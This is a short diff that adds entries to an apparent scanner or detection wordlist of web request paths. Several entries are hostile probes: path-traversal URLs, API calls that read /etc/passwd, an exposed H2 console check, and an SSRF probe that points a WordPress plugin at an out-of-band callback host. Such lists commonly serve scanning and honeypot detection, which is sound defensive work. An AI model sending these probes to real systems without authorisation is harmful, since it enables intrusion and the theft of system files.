@@ -128,3 +128,12 @@
 /wp-content/plugins/canto/readme.txt
 /wp-login.php
 /wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
+/wp-content/plugins/woocommerce-wholesale-lead-capture/readme.txt
+/dashboard%2e%2e/data/config.yaml
+/api/fs/read?allowOutsideWorkspace=true&path=/etc/passwd
+/h2-console/
+/api/system/fileView?file=/etc/passwd
+/api/system/fileDownload?file=/etc/passwd
+/cache/original/%2e%2e/composer.json
+/api/trpc/integration.all
+/ccm/system/dialogs/file/usage/1
